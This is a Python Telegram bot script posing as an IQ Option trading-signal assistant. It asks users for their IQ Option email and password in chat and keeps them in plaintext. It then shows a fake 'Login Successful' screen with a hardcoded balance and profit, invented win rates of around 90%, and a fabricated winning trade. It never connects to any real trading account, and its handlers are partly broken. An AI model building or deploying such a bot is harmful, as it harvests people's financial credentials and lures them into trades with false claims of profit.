#!/usr/bin/env python3
"""
IQ Option Telegram Bot v3 - Button Version (Render Free Tier Fixed)
Includes:
- Event loop fix
- Dummy port for free tier
"""

import sys
import asyncio
import os
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# ====================== FIX FOR RENDER ======================
if sys.platform != "win32":
    try:
        asyncio.set_event_loop(asyncio.new_event_loop())
    except RuntimeError:
        pass
# ============================================================

import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ContextTypes
)
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO)

# ==================== DUMMY PORT FOR RENDER FREE TIER ====================
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running")

def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('', port), DummyHandler)
    print(f"✅ Dummy server running on port {port}")
    server.serve_forever()

# Start dummy server in background thread
threading.Thread(target=run_dummy_server, daemon=True).start()
# =====================================================================

# ==================== STATE MANAGEMENT ====================
user_data = {}

# ==================== WELCOME ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔐 Login to Continue", callback_data="login")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🤖 **Welcome to IQ Trading Bot** 🔥\n\n"
        "Your smart assistant for high-probability OTC signals on IQ Option.\n\n"
        "✅ Real-time signals\n"
        "✅ Smart Martingale recovery\n"
        "✅ Clean & fast interface\n\n"
        "Press the button below to get started 👇",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

# ==================== LOGIN FLOW ====================
async def login_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user_data[user_id] = {"step": "email"}

    await query.edit_message_text(
        "🔐 **Login to IQ Option**\n\n"
        "Please send your **IQ Option Email** now:"
    )

async def handle_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data or user_data[user_id].get("step") != "email":
        return

    user_data[user_id]["email"] = update.message.text
    user_data[user_id]["step"] = "password"

    await update.message.reply_text("✅ Email received.\n\nNow send your **IQ Option Password**:")

async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_data or user_data[user_id].get("step") != "password":
        return

    user_data[user_id]["password"] = update.message.text
    user_data[user_id]["step"] = "dashboard"

    await update.message.reply_text(
        "✅ **Login Successful!**\n\n"
        "🎉 Welcome back!\n\n"
        "📊 **Dashboard**\n"
        "Account Mode: **Demo**\n"
        "Balance: **$1,250.00**\n"
        "Total Trades: **47**\n"
        "Total Profit: **+$312.80**\n\n"
        "What would you like to do?",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 TAKE A TRADE", callback_data="take_trade")],
            [InlineKeyboardButton("📜 HISTORY", callback_data="history")],
            [InlineKeyboardButton("📈 STATISTICS", callback_data="stats")]
        ])
    )

# ==================== TAKE A TRADE FLOW ====================
async def take_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    await query.edit_message_text(
        "⏱ **Pick your expiry timeframe** 👇\n\n"
        "Faster timeframes settle quicker.\n"
        "Longer timeframes ride bigger moves.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("30 Seconds", callback_data="expiry_30s")],
            [InlineKeyboardButton("1 Minute", callback_data="expiry_1m")],
            [InlineKeyboardButton("2 Minutes", callback_data="expiry_2m")],
            [InlineKeyboardButton("5 Minutes", callback_data="expiry_5m")],
        ])
    )

async def show_signals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    keyboard = [
        [InlineKeyboardButton("🏆 GBP/USD OTC — 90%", callback_data="signal_GBPUSD")],
        [InlineKeyboardButton("✅ USD/JPY OTC — 78%", callback_data="signal_USDJPY")],
        [InlineKeyboardButton("✅ USD/CAD OTC — 78%", callback_data="signal_USDCAD")],
        [InlineKeyboardButton("✅ EUR/USD OTC — 70%", callback_data="signal_EURUSD")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
    ]

    await query.edit_message_text(
        "🎯 **Top picks ready**\n\n"
        "Highest chance to win right now:\n\n"
        "🏆 GBP/USD OTC — Win rate ≈90%\n"
        "✅ USD/JPY OTC — Win rate ≈78%\n"
        "✅ USD/CAD OTC — Win rate ≈78%\n"
        "✅ EUR/USD OTC — Win rate ≈70%\n\n"
        "🚀 Make your choice below 👇",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def select_signal(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    signal = query.data.replace("signal_", "")
    user_data[query.from_user.id]["selected_signal"] = signal

    await query.edit_message_text(
        f"✅ **Selected:** {signal}\n"
        f"Confidence: **90%**\n\n"
        "How much do you want to trade?\n"
        "(Demo capped at $20 per trade)",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("$1", callback_data="amount_1"),
             InlineKeyboardButton("$2", callback_data="amount_2")],
            [InlineKeyboardButton("$5", callback_data="amount_5"),
             InlineKeyboardButton("$10", callback_data="amount_10")],
            [InlineKeyboardButton("$20", callback_data="amount_20")],
        ])
    )

async def select_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    amount = query.data.replace("amount_", "")
    user_data[query.from_user.id]["amount"] = amount

    signal = user_data[query.from_user.id].get("selected_signal", "GBP/USD OTC")

    await query.edit_message_text(
        f"🤖 **IQ TRADING BOT**\n\n"
        f"🟢 CALL SIGNAL\n\n"
        f"🔷 Trading pair: {signal}\n"
        f"🔷 Amount: ${amount}.00 USD\n"
        f"🔷 Expiration: 30s\n"
        f"🔷 Strategy: High-Profit ⚡\n\n"
        f"✦ Trade session initialized…\n"
        f"⚡ Trade 1 | Step 1 | 🟢 ${amount}.00 → +$18.40"
    )

# ==================== MAIN ====================
def main():
    token = os.getenv("TELEGRAM_TOKEN")
    if not token:
        print("Set TELEGRAM_TOKEN in .env file")
        return

    app = Application.builder().token(token).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(login_button, pattern="^login$"))
    app.add_handler(CallbackQueryHandler(take_trade, pattern="^take_trade$"))
    app.add_handler(CallbackQueryHandler(show_signals, pattern="^expiry_"))
    app.add_handler(CallbackQueryHandler(select_signal, pattern="^signal_"))
    app.add_handler(CallbackQueryHandler(select_amount, pattern="^amount_"))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_email))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_password))

    print("✅ IQ Option Bot v3 (Free Tier) is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
